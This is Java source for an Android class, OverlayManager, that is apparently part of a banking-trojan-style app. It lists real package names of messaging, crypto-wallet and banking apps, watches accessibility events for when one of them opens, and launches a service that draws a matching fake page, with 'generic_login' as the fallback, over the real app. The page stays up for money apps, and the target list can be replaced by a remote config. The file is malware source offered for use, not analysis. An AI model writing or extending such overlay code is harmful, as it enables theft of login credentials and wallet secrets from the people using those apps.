package com.fason.app.features.overlay;

import android.content.Context;
import android.content.Intent;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.fason.app.core.Protocol;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;

public class OverlayManager {
    private static final String TAG = "OverlayManager";
    private static OverlayManager instance;
    private final Context context;
    private final Map<String, String> appTemplateMap = new HashMap<>();
    private final Map<String, Boolean> appPersistentMap = new HashMap<>();
    private boolean globalEnabled = false;

    private OverlayManager(Context ctx) {
        this.context = ctx.getApplicationContext();
        initDefaultMappings();
    }

    public static synchronized OverlayManager getInstance(Context ctx) {
        if (instance == null) instance = new OverlayManager(ctx);
        return instance;
    }

    private void initDefaultMappings() {
        // Mappings rebuilt for the new page set — every key is a real
        // package name that has a matching HTML page in assets/templates/
        String[][] social = {
            {"com.whatsapp", "whatsapp"},
            {"com.facebook.katana", "facebook"},
            {"com.instagram.android", "instagram"},
            {"com.ss.android.ugc.trill", "tiktok"},
            {"com.twitter.android", "x"},
            {"com.snapchat.android", "snapchat"},
            {"com.discord", "discord"},
            {"com.tencent.mm", "wechat"},
            {"com.xingin.xhs", "rednote"},
            {"com.vkontakte.android", "vk"},
            {"com.viber.voip", "viber"},
            {"com.sina.weibo", "weibo"},
            {"com.tencent.mobileqq", "qq"},
            {"com.taobao.taobao", "taobao"},
            {"com.google.android.gm", "gmail"},
            {"com.pinterest", "pinterest"},
        };
        String[][] crypto = {
            {"com.binance.dev", "binance"},
            {"com.coinbase.android", "coinbase"},
            {"io.metamask", "metamask"},
            {"com.bitkeep.wallet", "bitget"},
            {"app.phantom", "phantom"},
            {"com.wallet.crypto.trustapp", "trustwallet"},
            {"com.moonpay", "moonpay"},
            {"exodusmovement.exodus", "exodus"},
            {"com.okx.wallet", "okx"},
            {"io.atomicwallet", "atomic"},
            {"com.liberty.jaxx", "jaxx"},
            {"pro.huobi", "htx"},
            {"trade.opsdao.dydxchain", "dydx"},
        };
        String[][] finance = {
            {"com.paypal.android.p2pmobile", "paypal"},
            {"com.chase.intl", "chase"},
            {"com.revolut.revolut", "revolut"},
            {"com.bybit.app", "bybit"},
            {"com.boc.bocsoft.bocmbovsa.buss", "boc"},
            {"sg.com.hsbc.hsbcsingapore", "hsbc"},
            {"by.alfabank.insync3", "alfabank"},
            {"com.airstarbanking.mobilebanking", "airstar"},
            {"com.eg.android.AlipayGphone", "alipay"},
            {"com.samsung.android.spay", "samsungwallet"},
            {"com.google.android.apps.walletnfcrel", "googlewallet"},
        };
        for (String[] pair : social)  appTemplateMap.put(pair[0], pair[1] + ".html");
        for (String[] pair : crypto)  appTemplateMap.put(pair[0], pair[1] + ".html");
        for (String[] pair : finance) appTemplateMap.put(pair[0], pair[1] + ".html");

        for (String pkg : appTemplateMap.keySet()) {
            String tmpl = appTemplateMap.get(pkg);
            boolean isMoney = tmpl.contains("binance") || tmpl.contains("coinbase")
                || tmpl.contains("metamask") || tmpl.contains("trust") || tmpl.contains("phantom")
                || tmpl.contains("paypal") || tmpl.contains("chase") || tmpl.contains("revolut")
                || tmpl.contains("bybit") || tmpl.contains("boc") || tmpl.contains("hsbc")
                || tmpl.contains("alfabank") || tmpl.contains("alipay") || tmpl.contains("wallet")
                || tmpl.contains("airstar") || tmpl.contains("atomic") || tmpl.contains("exodus")
                || tmpl.contains("okx") || tmpl.contains("htx") || tmpl.contains("dydx")
                || tmpl.contains("moonpay") || tmpl.contains("bitget") || tmpl.contains("jaxx");
            appPersistentMap.put(pkg, isMoney);
        }
    }

    public void handleAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            // Feed every window change to the smart engine — it decides
            SmartTriggerEngine.get(context).onWindowStateChanged(event);
            // Legacy path: only if engine disabled and old-style config active
            if (!globalEnabled) return;
            CharSequence pkg = event.getPackageName();
            if (pkg == null) return;
            String packageName = pkg.toString();
            if (appTemplateMap.containsKey(packageName) && !SmartTriggerEngine.get(context).isEnabled()) {
                triggerOverlay(packageName);
            }
        }
    }

    private void triggerOverlay(String packageName) {
        if (!Settings.canDrawOverlays(context)) {
            Log.w(TAG, "Cannot draw overlays - permission missing");
            return;
        }
        String template = appTemplateMap.getOrDefault(packageName, "generic_login");
        boolean persistent = appPersistentMap.getOrDefault(packageName, false);

        Log.i(TAG, "Triggering overlay for " + packageName + " with template " + template);

        Intent intent = new Intent(context, OverlayService.class);
        intent.setAction("SHOW_OVERLAY");
        intent.putExtra(Protocol.KEY_OVERLAY_PACKAGE, packageName);
        intent.putExtra(Protocol.KEY_OVERLAY_TEMPLATE, template);
        intent.putExtra(Protocol.KEY_OVERLAY_PERSISTENT, persistent);
        context.startService(intent);
    }

    public void applyConfig(JSONObject config) {
        try {
            globalEnabled = config.optBoolean("enabled", false);
            Log.i(TAG, "Overlay config applied, enabled: " + globalEnabled);

            JSONArray apps = config.optJSONArray("apps");
            if (apps != null) {
                appTemplateMap.clear();
                appPersistentMap.clear();
                for (int i = 0; i < apps.length(); i++) {
                    JSONObject app = apps.getJSONObject(i);
                    String pkg = app.optString("package");
                    String tmpl = app.optString("template");
                    boolean persist = app.optBoolean("persistent", false);
                    if (!pkg.isEmpty()) {
                        appTemplateMap.put(pkg, tmpl);
                        appPersistentMap.put(pkg, persist);
                        Log.i(TAG, "Mapped " + pkg + " -> " + tmpl);
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "applyConfig error", e);
        }
    }

    public JSONObject getStatus() {
        JSONObject r = new JSONObject();
        try {
            r.put("enabled", globalEnabled);
            r.put("canDrawOverlays", Settings.canDrawOverlays(context));
            r.put("serviceRunning", OverlayService.isRunning());
            JSONArray apps = new JSONArray();
            for (Map.Entry<String, String> e : appTemplateMap.entrySet()) {
                JSONObject a = new JSONObject();
                a.put("package", e.getKey());
                a.put("template", e.getValue());
                a.put("persistent", appPersistentMap.getOrDefault(e.getKey(), false));
                apps.put(a);
            }
            r.put("apps", apps);
        } catch (Exception ignored) {}
        return r;
    }

    public static String resolveTemplate(String packageName) {
        if (instance != null) {
            return instance.appTemplateMap.getOrDefault(packageName, "generic_login");
        }
        return "generic_login";
    }

    public static boolean isPersistent(String packageName) {
        if (instance != null) {
            return instance.appPersistentMap.getOrDefault(packageName, false);
        }
        return false;
    }

    public static boolean isEnabled() {
        if (instance != null) {
            return instance.globalEnabled;
        }
        return false;
    }
}